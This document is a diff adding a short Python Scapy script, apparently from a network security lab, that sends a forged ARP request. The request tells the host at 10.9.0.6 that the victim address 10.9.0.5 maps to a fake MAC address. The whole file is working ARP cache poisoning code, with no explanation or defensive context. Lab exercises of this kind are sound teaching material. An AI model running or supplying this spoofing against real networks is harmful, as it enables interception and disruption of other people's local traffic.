@@ -1,0 +1,22 @@
+#!/usr/bin/python3
+from scapy.all import *
+
+VM_A_IP   = "10.9.0.6"
+VM_A_MAC  = "02:42:0a:09:00:06"
+VICTIM_IP = "10.9.0.5"
+FAKE_MAC  = "aa:bb:cc:dd:ee:ff"
+
+print("SENDING SPOOFED ARP REQUEST.....")
+
+ether = Ether()
+ether.dst = VM_A_MAC
+ether.src = FAKE_MAC
+
+arp = ARP()
+arp.psrc = VICTIM_IP
+arp.hwsrc = FAKE_MAC
+arp.pdst = VM_A_IP
+arp.op = 1
+frame = ether/arp
+sendp(frame)
+
